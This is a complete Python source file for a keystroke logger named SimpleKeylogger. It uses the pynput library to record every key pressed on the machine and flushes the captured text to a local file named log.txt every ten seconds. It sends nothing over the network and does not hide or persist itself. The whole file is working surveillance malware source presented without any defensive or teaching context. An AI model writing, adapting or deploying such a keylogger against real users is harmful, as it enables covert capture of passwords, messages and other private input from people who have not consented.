import pynput.keyboard
import threading
import time

class SimpleKeylogger:
    def __init__(self):
        self.log = ""
        self.lock = threading.Lock()
        
    def append_to_log(self, key_strike):
        with self.lock:
            self.log += key_strike
    
    def write_log_to_file(self):
        with self.lock:
            with open("log.txt", "a+", encoding="utf-8") as file:
                file.write(self.log)
            self.log = ""
    
    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            elif key == key.enter:
                pressed_key = "\n"
            else:
                pressed_key = f" [{str(key)}] "
        self.append_to_log(pressed_key)
    
    def start(self):
        def on_press(key):
            self.evaluate_keys(key)
        
        def log_writer():
            while True:
                self.write_log_to_file()
                time.sleep(10)  # Write to log file every 10 seconds
        
        keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
        with keyboard_listener:
            log_writer_thread = threading.Thread(target=log_writer, daemon=True)
            log_writer_thread.start()
            keyboard_listener.join()

if __name__ == "__main__":
    SimpleKeylogger().start()
